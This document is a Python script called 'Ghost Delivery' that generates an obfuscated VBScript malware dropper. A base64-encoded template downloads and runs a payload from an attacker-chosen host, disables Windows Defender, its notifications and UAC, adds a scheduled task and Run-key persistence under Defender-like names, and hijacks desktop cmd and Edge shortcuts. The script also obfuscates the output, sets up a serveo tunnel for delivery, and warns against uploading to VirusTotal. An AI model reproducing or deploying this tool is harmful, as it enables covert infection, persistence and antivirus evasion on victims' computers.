import random, sys, string, os, time, base64
def clear():
    try: os.system('clear')
    except: _
    else: os.system('cls')
clear()

print("""
                -=-=::::::::::::::::::::::::::::::::::::::::::::::::::=-=-
                                    ~Ghost Delivery~
            -=-=:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::=-=-
                        This tool is designed create a .vbs script that:
            -=-=:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::=-=-

                  *Downloads payload to TEMP directory and executes payload
                   to bypass windows smart screen

                  *Disables Defender

                  *Disables UAC

                  *Disables Defender Notifications

                  *Injects Command Prompt and Microsoft Edge
                   shortcuts with payload path

                  *Adds scheduled task for payload to be run at login

                  *Obfuscates the vbs script

                  *Has serveo option to deliver obfuscated vbs script
""")

script = "J0lmIFdTY3JpcHQuQXJndW1lbnRzLmxlbmd0aCA9IDAgVGhlbicsICcgICBTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIlNoZWxsLkFwcGxpY2F0aW9uIiknLCAnICAgIG9ialNoZWxsLlNoZWxsRXhlY3V0ZSAid3NjcmlwdC5leGUiLCBDaHIoMzQpICYgXycsICcgICAgICBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lICYgQ2hyKDM0KSAmICIgdWFjIiwgIiIsICJydW5hcyIsIDEnLCAnRWxzZScsICdTZXQgd3NjID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIiknLCAnd3NjLmV4ZWMoInBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtY29tbWFuZCAmIHsgaXdyIGh0dHA6Ly9hZGRyZXNzL3BheWxvYWQuZXhlIC1PdXRGaWxlICVURU1QJS9wYXlsb2FkLmV4ZSB9OyAlVEVNUCUvLi9wYXlsb2FkLmV4ZTsgU2NodGFza3MgL0NyZWF0ZSAvdG4gV2luZG93c0RlZmVuZGVyIC9zYyBPTkxPR09OIC9ybCBoaWdoZXN0IC9ydSBzeXN0ZW0gL0YgL3RyICIiJVRFTVAlL3BheWxvYWQuZXhlIiIiKScsICd3c2MuUmVnV3JpdGUgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIgU2VjdXJpdHkgQ2VudGVyXE5vdGlmaWNhdGlvbnNcRGlzYWJsZUVuaGFuY2VkTm90aWZpY2F0aW9ucyIsIDEsICJSRUdfRFdPUkQiJywgJ3dzYy5SZWdXcml0ZSAiSEtMTVxTb2Z0d2FyZVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxVWCBDb25maWd1cmF0aW9uXE5vdGlmaWNhdGlvbl9TdXBwcmVzcyIsIDEsICJSRUdfRFdPUkQiJywgJ3dzYy5SZWdXcml0ZSAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW1cQ29uc2VudFByb21wdEJlaGF2aW9yVXNlciIsIDAsICJSRUdfRFdPUkQiJywgJ3dzYy5SZWdXcml0ZSAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW1cQ29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4iLCAwLCAiUkVHX0RXT1JEIicsICd3c2MuUmVnV3JpdGUgIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXFdpbmRvd3MgRGVmZW5kZXIiLCAiVEVNUC9wYXlsb2FkLmV4ZSIsICJSRUdfU1oiJywgJ3dzYy5SZWdXcml0ZSAiSEtMTVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cV2luZG93cyBTZWN1cml0eSIsICIlVEVNUCUvcGF5bG9hZC5leGUiLCAiUkVHX1NaIicsICd3c2MuUmVnV3JpdGUgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRGlzYWJsZUFudGlTcHl3YXJlIiwgMSwgIlJFR19EV09SRCInLCAnU2V0IGxuayA9IHdzYy5DcmVhdGVTaG9ydGN1dCh3c2MuU3BlY2lhbEZvbGRlcnMoImRlc2t0b3AiKSAmICJcY21kLkxOSyIpJywgJ2xuay50YXJnZXRwYXRoID0gIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSInLCAnbG5rLkFyZ3VtZW50cyA9ICIvYyBTVEFSVCAvTUlOIHBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtQ29tbWFuZCBTdGFydC1Qcm9jZXNzIGNtZDsgJVRFTVAlLy4vcGF5bG9hZC5leGUiJywgJ2xuay5zYXZlJywgJ1NldCBsbmsgPSB3c2MuQ3JlYXRlU2hvcnRjdXQod3NjLlNwZWNpYWxGb2xkZXJzKCJkZXNrdG9wIikgJiAiXE1pY3Jvc29mdCBFZGdlLkxOSyIpJywgJ2xuay50YXJnZXRwYXRoID0gIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSInLCAnbG5rLkFyZ3VtZW50cyA9ICIvYyBTVEFSVCAvTUlOIHBvd2Vyc2hlbGwuZXhlIC13aW5kb3dzdHlsZSBoaWRkZW4gLWNvbW1hbmQgc3RhcnQgbWljcm9zb2Z0LWVkZ2U6OyAlVEVNUCUvLi9wYXlsb2FkLmV4ZTsiJywgJ2xuay5zYXZlJywgJ0VuZCBpZicK"
liststring = base64.b64decode(script)
lines = liststring[1:-1].split("', '")

ip = raw_input("Enter server IP address hosting your payload (example: facebook.serveo.net): ")
lines = [content.replace('address', ip) for content in lines]

payload = raw_input("\nEnter name of payload to be delivered (Example: payload.exe): ")
lines = [content.replace('payload.exe', payload) for content in lines]

outfile = open("t", "w")
with open("t", "w") as file:
    for line in lines:
        file.write(line + "\n")
	file.close()

def obfs():
    splitter = str(chr(42))

    def randCapitalization(characters):
        capicharacter = ""
        for character in characters:
            lowup = random.randrange(0,2)
            if lowup == 0:
                capicharacter += character.upper()
            if lowup == 1:
                capicharacter +=  character.lower()
        return capicharacter

    NUM_OF_CHARS = random.randrange(5, 60)
    pld = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
    array = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
    temp = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
    x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))

    subOne = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
    subTwo = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))

    def obfu(body):
        encBody = ""
        for i in range(0, len(body)):
            if encBody == "":
                encBody += expr(ord(body[i]))
            else:
                encBody += "*" + expr(ord(body[i]))
        return encBody

    def expr(char):
        range = random.randrange(100, 10001)
        exp = random.randrange(0, 3)

        if exp == 0:
            print "Char " + str(char) + " -> " + str((range+char)) + "-" + str(range)
            return str((range+char)) + "-" + str(range)
        if exp == 1:
            print "Char " + str(char) + " -> " + str((char-range)) + "+" + str(range)
            return str((char-range)) + "+" + str(range)
        if exp == 2:
            print "Char " + str(char) + " -> " + str((char*range)) + "/" + str(range)
            return str((char*range)) + "/" + str(range)

    clear_text_file = open("t", "r")
    obfuscated_file = open("obfs.vbs", "w")

    obfuscated_file.write(randCapitalization("Dim " + pld + ", " + array + ", " + temp) + "\n")
    obfuscated_file.write(randCapitalization("Sub " + subOne) + "\n")
    obfuscated_file.write(randCapitalization(pld + " = ") + chr(34) + obfu(clear_text_file.read()) + chr(34) + "\n")
    obfuscated_file.write(randCapitalization(array + " = Split(" + pld + ", chr(eval(") + obfu(splitter) + ")))\n")
    obfuscated_file.write(randCapitalization("for each " + x + " in " + array) + "\n")
    obfuscated_file.write(randCapitalization(temp + " = " + temp + " & chr(eval(" + x) + "))\n")
    obfuscated_file.write(randCapitalization("next") + "\n")
    obfuscated_file.write(randCapitalization(subTwo) + "\n")
    obfuscated_file.write(randCapitalization("End Sub") + "\n")
    obfuscated_file.write(randCapitalization("Sub " + subTwo) + "\n")
    obfuscated_file.write(randCapitalization("eval(execute(" + temp) + "))\n")
    obfuscated_file.write(randCapitalization("End Sub") + "\n")
    obfuscated_file.write(randCapitalization(subOne) + "\n")
    clear_text_file.close()
    obfuscated_file.close()


def serveo():
    input = raw_input('\n\n\\ntDelivery script obfuscated and saved as "obfs.vbs"\n\n Would you like to start a serveo server to forward port 80 for payload delivery? yes/no: ')
    if input == "yes":
        domain = raw_input('enter subdomain name for serveo server: ')
        print("\n\nDon't upload to virus total!!!"* 15)
        time.sleep(2)
        os.system('ssh -o ServerAliveInterval=60 -R'+domain+'.serveo.net:80:localhost:80 serveo.net')
    elif input == "no":
        print("\n\nDon't upload to virus total!!!"* 15)
        time.sleep(2)
        sys.exit()

obfs()
os.remove('t')
time.sleep(1)
clear()
serveo()
